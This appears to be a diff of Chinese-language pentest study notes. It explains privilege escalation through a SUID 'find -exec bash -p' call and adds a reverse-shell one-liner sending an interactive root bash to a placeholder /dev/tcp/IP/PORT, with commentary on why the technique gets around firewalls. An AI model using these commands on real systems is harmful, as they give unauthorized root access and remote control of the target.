@@ -4,6 +4,10 @@ find PATH -exec bash -p \;
 语法规定在find ... -exec; 语句中，末尾必须加分号，但由于分号在shell中有特殊含义，
 需要反斜杠作用是告诉SHELL不要把分号解析成分隔符号。否则shell在解析后给find的输出中会因为解析成分隔符号而缺失给find。*/
 
+find /etc/shadow -exec bash -i >&  /dev/tcp/IP/PORT 0>&1 -p \;
+/* 将find进程打开的交互式bash的标准输出和标准错误输出重定向至新建立的虚拟socket(/dev/tcp/IP/PORT), 
+并将目标机的bash进程的标准输入(通过攻击机以socket TCP隧道输入的数据)重定向至标准输出，继承并利用find权限打开的bash终端进程，
+因为bash进程又指向刚刚的虚拟socket(/dev/tcp/IP/PORT)，因此stdin(0)和stdout(1)此刻都重定向至同一个socket，成功建立远程通讯。*/
 
 反弹 Shell 本质上是为了获得一个更稳定、更方便操作的会话。成功远程访问目标及webshell后，通过目标机终端主动向攻击机建立TCP连接(同时可以绕开防火墙)，
 并通过监听攻击机(local)的端口来收集指令交互数据包并输出到终端，以实现更加稳定的命令交互。
